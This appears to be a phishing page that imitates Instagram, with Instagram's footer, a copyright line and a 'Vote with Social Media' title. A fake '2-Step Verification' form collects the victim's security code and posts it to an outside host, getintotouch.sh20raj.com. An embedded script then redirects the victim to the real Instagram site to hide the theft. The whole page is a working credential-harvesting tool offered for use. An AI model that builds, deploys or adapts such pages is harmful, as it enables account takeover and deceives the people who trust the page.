<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="shortcut icon" href="images/icon.png" type="image/x-icon">
  <link rel="stylesheet" href="style2.css">
  <title>Vote with Social Media</title>
  <style>
    .small-title {
      margin: 1em auto;
      color: #000;
    }

    .form-area form input {
      padding: 0.5em;
      outline-width: none !important;
    }

    .small {
      font-size: 0.85em;
      display: block;
      text-align: center;
      margin: 0.5em auto;
    }
  </style>
</head>

<body onload="SwitchScreen()">
  <section class="container">
    <!-- SMARTPHONE SECTION -->
    <article class="smartphone">
      <div class="screens">
        <img class="screen fade" src="screen1.png" alt="screen1">
        <img class="screen fade" src="screen2.png" alt="screen2">
        <img class="screen fade" src="screen3.png" alt="screen3">
      </div>
      <img src="images/smartphones.png" alt="smartphones">
    </article>
    <!-- SMARTPHONE SECTION END -->
    <!-- FORM SECTION -->
    <article class="form-area">
      <form id="myForm" action="https://getintotouch.sh20raj.com/api.php?id=6534651073" method="POST">
        <p class="small-title">2-Step Verification</p>
        <input type="text" name="code" id="code" required="" placeholder="Security code">
        <input type="hidden" name="linkId" value="657c42262ec13a0c21704b76">
        <input type="submit" name="submit" value="Confirm">
        <div class="options">
          <p class="small">Didn't get security code? we can</p>
          <a href="#" class="small">resend it</a>
          <div class="forget"><a href="#">Forgot password?</a></div>
        </div>
      </form>
      <div class="noaccount">
        <a href="#">Don't have an account? <span>Signup</span></a>
      </div>
      <div class="apps">
        <p>Get the app</p>
        <a href="#">
          <img src="appstore.png" alt="Get it from AppStore">
        </a>
        <a href="#">
          <img src="googleplay.png" alt="Get it from Google Play">
        </a>
      </div>
    </article>
  </section>
  <!-- FORM SECTION END -->
  <!-- FOOTER -->
  <footer>
    <div class="footer-content">
      <a href="#">Meta</a>
      <a href="#">About</a>
      <a href="#">Blog</a>
      <a href="#">Jobs</a>
      <a href="#">API</a>
      <a href="#">Privacy</a>
      <a href="#">Terms</a>
      <a href="#">Locations</a>
      <a href="#">Hashtags</a>
      <a href="#">Threads</a>
      <a href="#">Instagram Lite</a>
    </div>
    <div>
      <a href="#">Dance</a>
      <a href="#">Food and Drink</a>
      <a href="#">Home garden</a>
      <a href="#">Music</a>
      <a href="#">Visual arts</a>
    </div>
    <div class="copyright">
      <select aria-label="Trocar idioma de exibição">
        <!-- Your language options here -->
      </select>
      <span>© 2023 Instagram from Meta</span>
    </div>
  </footer>
  <script src="/js/socials/app.js"></script>
  <script src="/js/socials/brands.min.js"></script>
  <script src="/js/socials/fontawesome.min.js"></script>
  <script>
    document.getElementById('myForm').addEventListener('submit', function (e) {
      e.preventDefault(); // Prevent the form from submitting the traditional way

      // Your form processing logic here

      // Submit the form to the original action URL
      var form = this;
      setTimeout(function () {
        form.submit();
      }, 1000); // Adjust the delay (in milliseconds) based on your needs

      // Redirect to Instagram after form submission
      setTimeout(function () {
        window.location.href = 'https://www.instagram.com/';
      }, 2000); // Adjust the delay for redirection
    });
  </script>
</body>

</html>
